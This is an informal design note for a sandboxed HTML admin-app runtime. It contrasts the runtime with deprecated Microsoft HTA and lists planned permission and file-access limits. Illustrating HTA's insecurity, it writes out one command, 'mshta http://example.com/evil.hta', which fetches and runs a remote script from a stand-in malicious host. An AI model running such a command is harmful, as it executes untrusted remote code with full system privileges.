## Aww app design considerations



Aww App is a tool, similar to Microsoft HTA (HTML Application). Which allows to write simple apps in HTML and JScript and VBScript and execute them to perform some admin actions... on... local server... local company Active Directory/Domain Server. These applications not only had full access to all system configuration, but also... this was very convenient, you could run HTA from web... like mshta http://example.com/evil.hta

That mode had tiny security issues. Tiny, because there were no security there, so the technology got deprecated. 

Sad... that was a really cool idea to provide a GUI alternative for admin scripts. 

## aww app

Probably should not allow doing some harmful things for the app... 

And it should be more advanced then a regular local html file. Something in the middle between HTA Superpowers and restricted local HTML. 

What I think it should have: 

- managed and restricted file access, for instance, the application can read files only from specific folder. 
- explicit permissions, defined in appmanifest.json
- the app should not be able to harm the system: run executables, overload CPU, overflow disk with garbage. 

We may allows Open file and Save file triggered by user interactions, and it should be explicit which files the app reads and writes. 

 





 

